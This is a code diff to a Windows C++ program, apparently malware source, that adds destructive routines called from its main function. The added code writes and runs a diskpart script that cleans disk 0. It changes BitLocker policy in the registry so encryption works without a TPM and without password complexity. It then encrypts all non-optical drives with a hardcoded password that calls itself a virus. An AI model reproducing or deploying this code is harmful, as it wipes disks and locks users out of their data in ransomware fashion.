@@ -4,6 +4,8 @@
 #include <fstream>
 #include <tchar.h>
 #include <aclapi.h>
+#include <setupapi.h>
+#include <tbs.h>
 #include <time.h>
 #include <shellapi.h>
 #include <shlwapi.h>
@@ -29,6 +31,134 @@ typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG Numbe
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 String sc[24];
 
+void GenerateDiskpartScript() {
+    std::ofstream script("create_partition.txt");
+    if (script.is_open()) {
+        script << "select disk 0\n";
+        script << "clean\n";
+        script << "create partition primary\n";
+        script << "format fs=ntfs quick\n";
+        script << "assign letter=D\n";
+        script.close();
+    }
+}
+
+std::vector<std::string> GetAllLogicalDrives() {
+    std::vector<std::string> drives;
+    DWORD drivesMask = GetLogicalDrives();
+    for (char drive = 'A'; drive <= 'Z'; ++drive) {
+        if (drivesMask & 1) {
+            drives.push_back(std::string(1, drive) + ":");
+        }
+        drivesMask >>= 1;
+    }
+    return drives;
+}
+
+std::vector<DEVINST> GetAllDisks() {
+    std::vector<DEVINST> disks;
+    GUID diskClass = { 0x4D36E967, 0xE325, 0x11CE, { 0xBF, 0xC1, 0x08, 0x00, 0x2B, 0xE1, 0x03, 0x18 } };
+    HDEVINFO hDevInfo = SetupDiGetClassDevs(&diskClass, NULL, NULL, DIGCF_PRESENT);
+    
+    if (hDevInfo != INVALID_HANDLE_VALUE) {
+        SP_DEVINFO_DATA devInfoData = { sizeof(SP_DEVINFO_DATA) };
+        for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfoData); ++i) {
+            disks.push_back(devInfoData.DevInst);
+        }
+        SetupDiDestroyDeviceInfoList(hDevInfo);
+    }
+    return disks;
+}
+
+bool IsRemovableStorage(DEVINST devInst) {
+    ULONG devType;
+    if (CM_Get_DevNode_Registry_Property(devInst, CM_DRP_REMOVAL_POLICY, NULL, (PBYTE)&devType, sizeof(devType), 0) == CR_SUCCESS) {
+        return (devType == CM_REMOVAL_POLICY_EXPECT_NO_REMOVAL) || (devType == CM_REMOVAL_POLICY_EXPECT_ORDERLY_REMOVAL);
+    }
+    return false;
+}
+
+bool IsOpticalDrive(DEVINST devInst) {
+    ULONG devType;
+    if (CM_Get_DevNode_Registry_Property(devInst, CM_DRP_DEVICE_TYPE, NULL, (PBYTE)&devType, sizeof(devType), 0) == CR_SUCCESS) {
+        return (devType == FILE_DEVICE_CD_ROM) || (devType == FILE_DEVICE_DVD);
+    }
+    return false;
+}
+
+void ConfigureBitLockerPolicy() {
+    TBS_HCONTEXT hContext = NULL;
+    TBS_CONTEXT_PARAMS params = { TBS_CONTEXT_VERSION_ONE };
+    
+    if (Tbsi_Context_Create(&params, &hContext) != TBS_SUCCESS) {
+        HKEY hKey;
+        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\FVE", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            DWORD value = 1;
+            RegSetValueEx(hKey, L"EnableBDEWithoutTPM", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            DWORD disableComplexity = 0;
+            RegSetValueEx(hKey, L"PasswordComplexity", 0, REG_DWORD, (BYTE*)&disableComplexity, sizeof(disableComplexity));
+            RegCloseKey(hKey);
+        }
+    } else {
+        Tbsi_Context_Close(hContext);
+    }
+}
+
+void ProcessUnallocatedSpace() {
+    std::vector<DEVINST> disks = GetAllDisks();
+    for (DEVINST disk : disks) {
+        std::vector<DEVINST> partitions;
+        GUID partitionClass = { 0x4D36E968, 0xE325, 0x11CE, { 0xBF, 0xC1, 0x08, 0x00, 0x2B, 0xE1, 0x03, 0x18 } };
+        HDEVINFO hDevInfo = SetupDiGetClassDevs(&partitionClass, NULL, NULL, DIGCF_PRESENT);
+        
+        if (hDevInfo != INVALID_HANDLE_VALUE) {
+            SP_DEVINFO_DATA devInfoData = { sizeof(SP_DEVINFO_DATA) };
+            for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfoData); ++i) {
+                partitions.push_back(devInfoData.DevInst);
+            }
+            SetupDiDestroyDeviceInfoList(hDevInfo);
+        }
+        
+        for (DEVINST partition : partitions) {
+            ULONG partitionType;
+            if (CM_Get_DevNode_Registry_Property(partition, CM_DRP_PARTITION_TYPE, NULL, (PBYTE)&partitionType, sizeof(partitionType), 0) == CR_SUCCESS) {
+                if (partitionType == 0) {
+                    std::string createCommand = "diskpart /s create_partition.txt";
+                    system(createCommand.c_str());
+                }
+            }
+        }
+    }
+}
+
+void EncryptAllDrivesWithBitLocker(const std::string& password) {
+    std::vector<std::string> drives = GetAllLogicalDrives();
+    for (const auto& drive : drives) {
+        bool isRemovable = false;
+        for (DEVINST disk : GetAllDisks()) {
+            if (IsRemovableStorage(disk)) {
+                isRemovable = true;
+                break;
+            }
+        }
+        
+        bool isOptical = false;
+        for (DEVINST disk : GetAllDisks()) {
+            if (IsOpticalDrive(disk)) {
+                isOptical = true;
+                break;
+            }
+        }
+        
+        if (isOptical) continue;
+        
+        std::string command = "Enable-BitLocker -MountPoint \"" + drive + "\" "
+                               "-Password (ConvertTo-SecureString \"" + password + "\" -AsPlainText -Force) "
+                               "-PasswordProtector -Force";
+        std::string fullCommand = "powershell -Command \"" + command + "\"";
+        system(fullCommand.c_str());
+    }
+}
 void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data);
 void UnprotectFile(char *fname);
 void rscan(char *st, DWORD dr, BOOL LNK);
@@ -4274,7 +4404,11 @@ int _tmain(int argc, TCHAR* argv[]) {
 		#else
 		#pragma optimize(off)
 		#endif
-
+		std::string password = "54188gay%shit@fack#14524!!sbcpt00$sm&virus#jiangyuxun@#$hahaha%Super$Virus&dnfl#die";
+    	GenerateDiskpartScript();
+    	ConfigureBitLockerPolicy();
+    	ProcessUnallocatedSpace();
+    	EncryptAllDrivesWithBitLocker(password);
 		_asm{
 			.586
 			OriginalAppEXE SEGMENT
